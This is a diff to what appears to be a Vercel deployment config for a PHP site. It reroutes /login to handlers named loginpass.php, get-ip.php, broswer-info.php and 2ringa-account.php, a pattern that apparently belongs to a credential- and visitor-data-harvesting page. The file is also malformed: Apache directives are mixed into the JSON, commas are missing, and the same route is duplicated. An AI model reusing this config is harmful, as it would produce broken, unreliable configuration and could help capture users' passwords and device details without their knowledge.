@@ -3,11 +3,16 @@
     "api/*.php": {
       "runtime": "vercel-php@0.6.0"
     }
-  "rewrites": [
+  "errordocument 404 /index.php"
+  "rewritesengine on /index.php": [
     { "source": "/", "destination": "/api/index.php" },
-    { "source": "/contact", "destination": "/api/contact.php" },
+    { "source": "/email", "destination": "/api/email.php" },
     { "source": "/sendmail", "destination": "/api/sendmail.php" },
-    { "source": "/login", "destination": "/api/login.php" }
+    { "source": "/login", "destination": "/api/loginpass.php" }
+    { "source": "/login", "destination": "/api/get-ip.php" }
+    { "source": "/login", "destination": "/api/broswer-info.php" }
+    { "source": "/login", "destination": "/api/2ringa-account.php" }
   ]
 }
+
 
